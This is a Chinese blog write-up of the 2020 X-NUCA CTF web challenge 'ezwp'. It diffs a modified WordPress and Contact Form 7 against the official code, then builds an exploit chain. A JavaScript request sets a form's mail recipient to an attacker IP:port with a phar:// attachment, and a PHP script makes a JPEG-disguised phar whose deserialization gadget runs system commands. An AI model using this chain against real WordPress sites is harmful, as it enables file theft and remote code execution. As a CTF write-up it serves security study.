  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020xnuca_ezwp题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-xnuca-ezwp题解"><a href="#2020-xnuca-ezwp题解" class="headerlink" title="2020 xnuca ezwp题解"></a>2020 xnuca ezwp题解</h1><p>wpscan扫一波发现wp是最新版本</p>
<p>本地搭好环境后，登入后台发现，有个插件是n年前的版本，很明显漏洞点在这</p>
<p>漏洞分析：<a href="https://paper.seebug.org/774/" target="_blank" rel="noopener">https://paper.seebug.org/774/</a></p>
<p>对wp和插件对比以下官方下载的，存在以下差异</p>
<h2 id="文件对比"><a href="#文件对比" class="headerlink" title="文件对比"></a>文件对比</h2><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>/wp-admin/includes/class-wp-screen.php 294行</p>
<hr>
<p>官方</p>
<pre><code>if ( isset( $_GET[&#39;post&#39;] ) &amp;&amp; isset( $_POST[&#39;post_ID&#39;] ) &amp;&amp; (int) $_GET[&#39;post&#39;] !== (int) $_POST[&#39;post_ID&#39;] ) {
                        wp_die( __( &#39;A post ID mismatch has been detected.&#39; ), __( &#39;Sorry, you are not allowed to edit this item.&#39; ), 400 );
                    } elseif ( isset( $_GET[&#39;post&#39;] ) ) {
                        $post_id = (int) $_GET[&#39;post&#39;];
                    } elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
                        $post_id = (int) $_POST[&#39;post_ID&#39;];
                    } else {
                        $post_id = 0;
                    }</code></pre><p>题目</p>
<pre><code>if ( isset( $_GET[&#39;post&#39;] ) ) {
                        $post_id = (int) $_GET[&#39;post&#39;];
                    } elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
                        $post_id = (int) $_POST[&#39;post_ID&#39;];
                    } else {
                        $post_id = 0;
                    }</code></pre><hr>
<p>/wp-admin/includes/file.php 762行加了一个文件名不能包含php的waf（只检测了小写）</p>
<p>官方</p>
<pre><code>空</code></pre><p>题目</p>
<pre><code>if ( (stristr(file_get_contents($file[&#39;tmp_name&#39;]), &quot;php&quot;) !== FALSE) ) {
        return call_user_func_array( $upload_error_handler, array( &amp;$file, __( &#39;Sorry, this file content is not permitted for security reasons.&#39; ) ) );
    }</code></pre><hr>
<p>/wp-admin/includes/post.php 221</p>
<p>array_diff_key 参数少了’file’</p>
<p>官方</p>
<pre><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;file&#39;, &#39;guid&#39; ) ) );</code></pre><p>题目</p>
<pre><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) );</code></pre><hr>
<p>wp-admin/post.php 19行，少了很多条件</p>
<p>官方</p>
<pre><code>if ( isset( $_GET[&#39;post&#39;] ) &amp;&amp; isset( $_POST[&#39;post_ID&#39;] ) &amp;&amp; (int) $_GET[&#39;post&#39;] !== (int) $_POST[&#39;post_ID&#39;] ) {
    wp_die( __( &#39;A post ID mismatch has been detected.&#39; ), __( &#39;Sorry, you are not allowed to edit this item.&#39; ), 400 );
} elseif ( isset( $_GET[&#39;post&#39;] ) ) {
    $post_id = (int) $_GET[&#39;post&#39;];
} elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
    $post_id = (int) $_POST[&#39;post_ID&#39;];
} else {
    $post_id = 0;
}</code></pre><p>题目</p>
<pre><code>if ( isset( $_GET[&#39;post&#39;] ) ) {
    $post_id = (int) $_GET[&#39;post&#39;];
} elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
    $post_id = (int) $_POST[&#39;post_ID&#39;];
} else {
    $post_id = 0;
}</code></pre><p>wp-includes\Requests\Utility\FilteredIterator.php<br>删除了:</p>
<pre><code>public function unserialize( $serialized ) {
    }

    /**
     * @inheritdoc
     */
    public function __unserialize( $serialized ) { // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__unserializeFound
    }

    public function __wakeup() { // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__wakeupFound
        unset( $this-&gt;callback );
    }</code></pre><h3 id="contact-form-7"><a href="#contact-form-7" class="headerlink" title="contact form 7"></a>contact form 7</h3><p>原来：<br>134行：</p>
<pre><code>    return wp_mail( $recipient, $subject, $body, $headers, $attachments );
}</code></pre><p>题目：</p>
<pre><code>return $this-&gt;send_mail( $recipient, $subject, $body, $headers, $attachments );
    }

    public function send_mail($to, $subject, $message, $headers = &#39;&#39;, $attachments = array()) {
        try {
            $host = explode(&quot;@&quot;, $to)[1];
            $url = &quot;http://$host&quot;;
            $post_data = array(
                &quot;subject&quot; =&gt; $subject,
                &quot;message&quot; =&gt; $message,
                &quot;headers&quot; =&gt; $headers
            );
            if ($attachments !== array()) {
                if (!empty($attachments[0])) {
                    $post_data[&quot;file&quot;] = curl_file_create($attachments[0]);
                }
            }
            $ch = curl_init();
            curl_setopt($ch , CURLOPT_URL , $url);
            curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch , CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
            curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);
            $data = curl_exec($ch);
            curl_close($ch);
            if ($data) {
                file_put_contents(&quot;/tmp/1.log&quot;, $data);
            }
            return true;
        } catch (Exception $e) {
            return false;
        }
    }</code></pre><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>跟以下之前的漏洞发现，漏洞点调用了wp_mail，而题目改成了send_mail，里面的存在文件系统相关的函数，加上题目删除反序列化的方法，大概率思路就是利用之前的漏洞+反序列化getshell</p>
<h2 id="绕过最新版本wp限制来利用历史漏洞"><a href="#绕过最新版本wp限制来利用历史漏洞" class="headerlink" title="绕过最新版本wp限制来利用历史漏洞"></a>绕过最新版本wp限制来利用历史漏洞</h2><p>利用原来的payload直接打过去发现不太行，跟踪发现：</p>
<p>/wp-admin/includes/post.php 221：</p>
<p><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) );</code></p>
<p>最新版wp对post数据进行了过滤，删除了meta_input和guid的键，导致我们无法写入postmeta,继续跟踪发现有个地方可以用别的键写入postmeta:</p>
<p>/wp-admin/includes/post.php 872：</p>
<p><code>add_meta( $post_ID );</code></p>
<pre><code class="php">function add_meta( $post_ID ) {
    $post_ID = (int) $post_ID;

    $metakeyselect = isset( $_POST[&#39;metakeyselect&#39;] ) ? wp_unslash( trim( $_POST[&#39;metakeyselect&#39;] ) ) : &#39;&#39;;
    $metakeyinput  = isset( $_POST[&#39;metakeyinput&#39;] ) ? wp_unslash( trim( $_POST[&#39;metakeyinput&#39;] ) ) : &#39;&#39;;
    $metavalue     = isset( $_POST[&#39;metavalue&#39;] ) ? $_POST[&#39;metavalue&#39;] : &#39;&#39;;
    if ( is_string( $metavalue ) ) {
        $metavalue = trim( $metavalue );
    }

    if ( ( ( &#39;#NONE#&#39; !== $metakeyselect ) &amp;&amp; ! empty( $metakeyselect ) ) || ! empty( $metakeyinput ) ) {
        /*
         * We have a key/value pair. If both the select and the input
         * for the key have data, the input takes precedence.
         */
        if ( &#39;#NONE#&#39; !== $metakeyselect ) {
            $metakey = $metakeyselect;
        }

        if ( $metakeyinput ) {
            $metakey = $metakeyinput; // Default.
        }

        if ( is_protected_meta( $metakey, &#39;post&#39; ) || ! current_user_can( &#39;add_post_meta&#39;, $post_ID, $metakey ) ) {
            return false;
        }

        $metakey = wp_slash( $metakey );

        return add_post_meta( $post_ID, $metakey, $metavalue );
    }

    return false;
}</code></pre>
<p>但是这里有个is_protected_meta,跟进去发现这个函数限制了我们的键不能以<code>_</code>开头，按照原来的payload，到这里好像死路了。</p>
<p>但是我们跟踪以下插件渲染表单的代码发现</p>
<p>contact-form.php:129</p>
<p>class WPCF7_ContactForm</p>
<pre><code class="php">private function __construct( $post = null ) {
        $post = get_post( $post );

        if ( $post &amp;&amp; self::post_type == get_post_type( $post ) ) {
            $this-&gt;id = $post-&gt;ID;
            $this-&gt;name = $post-&gt;post_name;
            $this-&gt;title = $post-&gt;post_title;
            $this-&gt;locale = get_post_meta( $post-&gt;ID, &#39;_locale&#39;, true );

            $properties = $this-&gt;get_properties();

            foreach ( $properties as $key =&gt; $value ) {
                if ( metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key ) ) {
                    $properties[$key] = get_post_meta( $post-&gt;ID, &#39;_&#39; . $key, true );
                } elseif ( metadata_exists( &#39;post&#39;, $post-&gt;ID, $key ) ) {
                    $properties[$key] = get_post_meta( $post-&gt;ID, $key, true );
                }
            }

            $this-&gt;properties = $properties;
            $this-&gt;upgrade();
        }

        do_action( &#39;wpcf7_contact_form&#39;, $this );
    }</code></pre>
<p>contact form 的属性啥的就是从<code>$properties</code>中取出(<code>_mail</code>就在这里面)，想要利用历史漏洞我们必须能够控制<code>_mail</code>的值</p>
<p><code>metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key )</code>:它先会去表中查找<code>&quot;_&quot;.&quot;mail&quot;</code>这个属性，没有的话再去查找<code>&quot;mail&quot;</code>属性，正好我们前面找到一个可以控制非<code>_</code>开头的postmeta</p>
<p>于是构造</p>
<pre><code class="javascript">var settings = {
    &quot;async&quot;: true,
    &quot;crossDomain&quot;: true,
    &quot;url&quot;: &quot;/wp-admin/post.php?post=1&quot;,
    &quot;method&quot;: &quot;POST&quot;,
    &quot;data&quot;: {
        &quot;_wpnonce&quot;: document.getElementById(&quot;_wpnonce&quot;).value,
        &quot;_wp_http_referer&quot;: &quot;%2Fwp-admin%2Fpost-new.php&quot;,
        &quot;user_ID&quot;: &quot;3&quot;,
        &quot;action&quot;: &quot;post&quot;,
        &quot;originalaction&quot;: &quot;editpost&quot;,
        &quot;post_author&quot;: &quot;3&quot;,
        &quot;post_type&quot;: &quot;wpcf7_contact_form&quot;,
        &quot;original_post_status&quot;: &quot;auto-draft&quot;,
        &quot;auto_draft&quot;: &quot;&quot;,
        &quot;post_title&quot;: &quot;readflagtotmp2log&quot;,
        &quot;content&quot;: &quot;test&quot;,
        &quot;wp-preview&quot;: &quot;&quot;,
        &quot;hidden_post_status&quot;: &quot;draft&quot;,
        &quot;post_status&quot;: &quot;draft&quot;,
        &quot;hidden_post_password&quot;: &quot;&quot;,
        &quot;hidden_post_visibility&quot;: &quot;public&quot;,
        &quot;visibility&quot;: &quot;public&quot;,
        &quot;post_password&quot;: &quot;&quot;,
        &quot;mm&quot;: &quot;12&quot;,
        &quot;jj&quot;: &quot;22&quot;,
        &quot;_thumbnail_id&quot;: &quot;-1&quot;,
        &quot;advanced_view&quot;: &quot;1&quot;,
        &quot;comment_status&quot;: &quot;open&quot;,
        &quot;ping_status&quot;: &quot;open&quot;,
        &quot;post_name&quot;: &quot;&quot;,
        &quot;metakeyinput&quot;:&quot;mail&quot;,
        &quot;metavalue[subject]&quot;: &quot;test \&quot;[your-subject]\&quot;&quot;,
        &quot;metavalue[sender]&quot;: &quot;2&quot;,
        &quot;metavalue[recipient]&quot;: &quot;ccreater@172.16.8.6:60000&quot;,
        &quot;metavalue[body]&quot;: &quot;From: [your-name] &lt;[your-email]&gt;\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n&quot;,
        &quot;metavalue[additional_headers]&quot;: &quot;Reply-To: [your-email]&quot;,
        &quot;metavalue[attachments]&quot;: &quot;phar://./wp-content/uploads/2020/12/phar.jpg&quot;,
        &quot;metavalue[use_html]&quot;: &quot;false&quot;,
        &quot;metavalue[exclude_blank]&quot;: &quot;false&quot;,
        &quot;metakeyselect&quot;:&quot;#NONE#&quot;

    }
}
jQuery.ajax(settings).done(function (response) {
    console.log(response);
});</code></pre>
<p>在dashboard那里执行这个js</p>
<p>成功写入<code>mail</code>:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201208232404.png" alt="image8421"></p>
<p>因为没有<code>_form</code>属性（上面那个设置postmeta的一次只能设置一个），所以我们要手动提交<code>jQuery(&quot;.wpcf7-form&quot;).submit()</code>，接着就可以读取文件和反序列化了</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><pre><code class="php">&lt;?php

namespace Kigkonsult\Icalcreator{
    class Vtimezone{
        public $timezonetype;
        public $components;
        public function __construct($val)
        {
            $this-&gt;components = $val;
        }
    }
}
namespace {

    require( &#39;wp-load.php&#39; );  //???????
    require_once( dirname( __FILE__ ) . &#39;/wp-includes/Requests/Utility/FilteredIterator.php&#39; );
    $arr  = array(
        &quot;1&quot; =&gt; &quot;/readflag&gt;/tmp/2.log&quot;  //payload
    );
    $obj_ = new Requests_Utility_FilteredIterator( $arr, &quot;system&quot; );
    $obj  = new Kigkonsult\Icalcreator\Vtimezone( $obj_ );


    @unlink( &quot;test.gif&quot; );
    $phar = new Phar( &quot;test.phar&quot; );
    $phar-&gt;startBuffering();
    $phar-&gt;setStub( base64_decode( &quot;/9j/4AAQSkZJRgABAgEASABIAAD//gARSlBFRyBJbWFnZXIgMi4x/9sAhAAGBAUGBQQGBgUGBwcGCAoQCgoJCQoUDg8MEBcUGBgXFBYWGh0lHxobIxwWFiAsICMmJykqKRkfLTAtKDAlKCkoAQMEBAUE&quot; ) . &quot; __HALT_COMPILER(); ?&gt;&quot; );
    $phar-&gt;setMetadata( $obj );
    $phar-&gt;addFromString( &quot;test.txt&quot;, &quot;test&quot; ); //????????
    //??????
    $phar-&gt;stopBuffering();
    rename( &quot;test.phar&quot;, &quot;test.gif&quot; );
}
</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/2020xnuca_ezwp题解/">https://www.ccreater.top/1970/01/01/2020xnuca_ezwp题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" data-id="ckmn5754o000gs1ni4zm98hui" data-title="2020xnuca_ezwp题解" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">避免rm -rf *的悲惨命运</a>
          </li>
        
          <li>
            <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">勉强能用的论文降重</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>